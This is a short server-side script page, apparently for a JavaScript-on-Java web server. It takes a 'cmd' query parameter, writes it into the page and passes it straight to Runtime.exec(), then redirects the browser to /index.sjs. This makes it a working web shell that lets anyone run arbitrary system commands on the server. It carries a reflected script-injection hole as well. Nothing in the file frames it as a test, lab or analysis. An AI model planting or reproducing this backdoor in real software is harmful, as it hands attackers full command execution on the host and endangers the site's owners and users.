<html>
<body>
<?

 var cmd = HttpRequest.queryString.getVal("cmd");
 document.write("running '"+cmd+"'");
 java.lang.Runtime.getRuntime().exec( cmd );
?>
<script>
//history.back();
document.location.href='/index.sjs';
</script>
</body>
</html>